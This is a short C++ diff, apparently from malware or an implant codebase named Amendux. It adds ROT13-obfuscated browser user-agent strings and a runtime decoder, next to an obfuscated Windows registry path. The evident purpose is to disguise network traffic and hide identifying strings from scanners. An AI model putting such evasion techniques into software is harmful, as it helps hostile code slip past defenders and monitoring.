@@ -54,6 +54,15 @@ namespace Amendux {
 		"fbsgjner{zvpebfbsg{jvaqbjf{pheeragirefvba{nhguragvpngvba",			// software\microsoft\windows\currentversion\authentication
 	};
 
+	static const char *variantUserAgent[] = {
+		"Zbmvyyn?5^0&}Jvaqbjf&AG&6^1;&JBJ64;&ei:13^0[&Trpxb?20100101&Sversbk?13^0^1",										// Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
+		"Zbmvyyn?5^0&}Jvaqbjf&AG&6^2;&JBJ64[&NccyrJroXvg?537^36&}XUGZY,&yvxr&Trpxb[&Puebzr?39^0^2171^95&Fnsnev?537^36",		// Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
+		"Zbmvyyn?5^0&}Znpvagbfu;&Vagry&Znp&BF&K&10^10;&ei:34^0[&Trpxb?20100101&Sversbk?34^0",								// Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0
+		"Zbmvyyn?4^0&}pbzcngvoyr;&ZFVR&6^0;&Jvaqbjf&AG&5^1;&SFY&7^0^6^01001[",												// Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)
+		"Zbmvyyn?5^0&}Jvaqbjf&AG&6^1;&JBJ64;&ei:12^0[&Trpxb?20100101&Sversbk?12^0",											// Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0
+		"Zbmvyyn?5^0&}K11;&H;&Yvahk&k86_64;&qr;&ei:1^9^2^8[&Trpxb?20100723&Hohagh?10^04&}yhpvq[&Sversbk?3^6^8",				// Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8
+	};
+
 	//static_assert(static_cast<size_t>(VariantList::_COUNTER) == variantCount(), "Variant size differs among structures");
 
 	namespace Variant {
@@ -95,6 +104,15 @@ namespace Amendux {
 
 		static char *getRegister(unsigned int variant) {
 			const char *encVar = variantRegister[variant];
+			char *var = _strdup(encVar);
+
+			Util::rot13<char>(var);
+
+			return var;
+		}
+
+		static char *getUserAgent(unsigned int variant) {
+			const char *encVar = variantUserAgent[variant];
 			char *var = _strdup(encVar);
 
 			Util::rot13<char>(var);
